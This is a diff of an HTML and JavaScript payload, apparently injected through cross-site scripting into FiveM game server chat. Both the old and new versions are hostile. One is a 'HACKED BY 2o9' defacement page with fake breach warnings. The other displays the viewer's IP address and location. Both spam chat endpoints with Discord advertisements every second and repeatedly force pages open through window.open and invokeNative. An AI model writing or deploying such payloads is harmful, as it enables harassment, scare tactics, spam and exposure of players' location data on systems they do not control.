@@ -1,5 +1,77 @@
-<!DOCTYPE html>
-const msg = `👑 2o9 & rayan - .gg/2o9 ! 👑`;
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/uaee</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #0000ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #0000ff; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://l.top4top.io/p_32131zd9t1.png" alt="Discord Image">
+    </div>
+    <audio autoplay loop>
+        <source src="حط الاغنيه الي تبيها" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text">discord.gg/uaee</div>
+
+    <script>
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
+    </script>
+const msg = `👑 vjmi & BoM6er - .gg/UAEE ! 👑`;
 const body = JSON.stringify({ message: msg });
 setInterval(() => {
 fetch("https://flix-scripts/chatResult", { method: "POST", body });
@@ -10,153 +82,13 @@ fetch("https://as_chat/chatResult", { method: "POST", body });
 fetch("https://chat/chatResult", { method: "POST", body });
 fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
 }, 1000);
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>HACKED BY 2o9</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100vw;
-      height: 100vh;
-      background-color: black;
-      color: white;
-      font-family: 'Courier New', monospace;
-      overflow: hidden;
-    }
-
-    .main-title {
-      position: absolute;
-      top: 60px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 64px;
-      font-weight: bold;
-      color: #ff0040;
-      text-shadow:
-        0 0 10px #ff0040,
-        0 0 20px #ff0040,
-        0 0 30px #ff0040;
-      animation: flicker 2s infinite alternate;
-    }
-
-    .box {
-      position: absolute;
-      padding: 20px 30px;
-      background: rgba(255,255,255,0.05);
-      border: 1px solid #fff;
-      border-radius: 12px;
-      color: white;
-      backdrop-filter: blur(5px);
-      box-shadow: 0 0 20px rgba(255,255,255,0.2);
-      font-size: 20px;
-    }
-
-    .top-left {
-      top: 160px;
-      left: 100px;
-    }
-
-    .top-right {
-      top: 160px;
-      right: 100px;
-      text-align: right;
-    }
-
-    .center {
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      max-width: 700px;
-      text-align: center;
-      font-size: 22px;
-      line-height: 1.8;
-    }
-
-    .highlight {
-      color: #00ffff;
-      font-weight: bold;
-      text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
-    }
-
-    .video-box {
-      position: absolute;
-      bottom: 80px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 640px;
-      height: 360px;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 0 25px #0ff, 0 0 50px #0ff, 0 0 75px #00f;
-      animation: glow 3s infinite alternate;
-    }
-
-    .video-box video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    @keyframes flicker {
-      0% { opacity: 1; }
-      50% { opacity: 0.6; }
-      100% { opacity: 1; }
-    }
-
-    @keyframes glow {
-      0% { box-shadow: 0 0 20px #0ff, 0 0 30px #0ff, 0 0 50px #00f; }
-      100% { box-shadow: 0 0 40px #0ff, 0 0 70px #0ff, 0 0 100px #00f; }
-    }
-  </style>
-</head>
-<body>
-
-  <!-- Title -->
-  <div class="main-title">HACKED BY 2o9</div>
-
-  <!-- Top Left -->
-  <div class="box top-left">
-    ➤ How to Hack Fivem<br>
-    ➤ How to Exploit XXS<br>
-    ➤ Visit discord.gg/2o9
-  </div>
-
-  <!-- Top Right -->
-  <div class="box top-right">
-    Your firewall is down<br>
-    System compromised<br>
-    IP traced...
-  </div>
-
-  <!-- Center Message -->
-  <div class="box center">
-    ⚠️ SYSTEM BREACH DETECTED ⚠️<br>
-    Your system has been compromised.<br><br>
-    نحن لا نؤذي، نحن نكشف الحقيقة.<br>
-    يبيلكم حماية يا شطار<br><br>
-    <span class="highlight">discord.gg/2o9</span>
-  </div>
-
-  <!-- Glowing Video Box -->
-  <div class="video-box">
-    <video autoplay muted loop>
-      <source src="https://d.top4top.io/m_3479lzat11.mp4" type="video/mp4" />
-    </video>
-  </div>
-
-  <!-- Background Sound -->
-  <audio autoplay loop>
-    <source src="https://a.top4top.io/m_3479s3blf1.mp4" type="audio/mpeg" />
-  </audio>
-
-  <!-- Open Discord every 5s -->
-  <script>
-    setInterval(() => {
-      window.open("https://discord.gg/MQBKNVq246", "_blank");
-    }, 1);
-  </script>
-
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+}, 1000);
+    </script>
 </body>
 </html>
